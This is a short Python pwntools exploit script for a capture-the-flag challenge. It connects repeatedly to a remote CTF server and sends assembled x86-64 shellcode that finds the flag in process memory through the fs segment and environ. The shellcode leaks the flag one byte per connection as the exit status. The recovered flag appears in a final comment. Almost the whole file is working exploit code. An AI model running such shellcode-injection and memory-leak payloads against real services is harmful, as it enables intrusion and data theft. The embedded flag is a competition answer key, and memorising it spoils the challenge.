#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import success
from pwn import *
import time

context.arch = "amd64"

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

# io = process("./z2h")

ans = ""

for i in range(0x100):
    io = remote("gold.b01le.rs", 4005)
    shellcode = asm(f"""
        mov r12, fs:[0x00];
        sub r12, {0x3fc0 - 0x80}; // environ
        mov r13, [r12];
        sub r13, 0x30;
        mov r15, [r13];
        add r15, 0x2c12;

        movzx rdi, byte ptr [r15 + {i}];
        mov rax, 60;
        syscall;
    """).hex()

    ru(b"input: ")
    sl(shellcode)
    ru(b"return value: ")
    data = chr(int(rl()))
    io.close()
    ans += data
    print(ans)

# bctf{x86_64_r3g1sTer_bL0at_sAVe5_7he_d4y:D_%#$*}
